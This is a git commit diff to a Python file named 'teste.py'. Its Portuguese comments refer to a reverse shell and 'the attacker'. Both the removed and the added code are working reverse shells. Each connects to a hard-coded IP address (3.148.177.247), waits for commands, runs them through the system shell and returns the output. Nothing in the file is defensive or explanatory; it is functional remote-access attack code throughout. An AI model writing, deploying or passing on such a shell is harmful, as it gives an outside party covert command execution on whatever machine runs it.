ee8094c7687a11b320cefc9aa1d243a2d824d078
Roniin-Sudden <roniinsudden@gmail.com>
2025-05-31 23:37:21 -0400

    Update teste.py

--- teste.py
+++ teste.py
@@ -2,36 +2,28 @@ import socket
 import subprocess
 import os
 
-def reverse_shell():
-    # Configura o endereço IP e a porta do servidor
-    servidor_ip = '3.148.177.247'  # Substitua pelo IP do servidor
-    servidor_porta = 4555  # Substitua pela porta que você está usando
+# Substitua pelo IP da sua instância EC2
+server_ip = "3.148.177.247"
+server_port = 8553
+print(server_ip, server_port)
+# Cria um socket e conecta ao servidor
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect((server_ip, server_port))
 
-    # Cria um socket
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    # Conecta ao servidor
-    s.connect((servidor_ip, servidor_porta))
+while True:
+    # Recebe o comando do atacante
+    command = client.recv(1024).decode("utf-8")
+    if command.lower() == "exit":
+        break
+    # Executa o comando e envia a saída de volta
+    if command.startswith("cd "):
+        try:
+            os.chdir(command.strip("cd "))
+            client.send(b"Changed directory")
+        except FileNotFoundError as e:
+            client.send(str(e).encode())
+    else:
+        output = subprocess.run(command, shell=True, capture_output=True)
+        client.send(output.stdout + output.stderr)
 
-    while True:
-        # Recebe o comando do servidor
-        comando = s.recv(1024).decode('utf-8')
-        
-        if comando.lower() == 'sair':
-            break
-        
-        # Executa o comando e captura a saída
-        if comando.startswith("cd "):
-            try:
-                os.chdir(comando.strip("cd "))
-                s.send(b'Alterado para o diretório: ' + os.getcwd().encode('utf-8'))
-            except FileNotFoundError as e:
-                s.send(str(e).encode('utf-8'))
-        else:
-            resultado = subprocess.run(comando, shell=True, capture_output=True, text=True)
-            s.send(resultado.stdout.encode('utf-8') + resultado.stderr.encode('utf-8'))
-
-    s.close()
-
-# Executa a reverse shell
-reverse_shell()
+client.close()
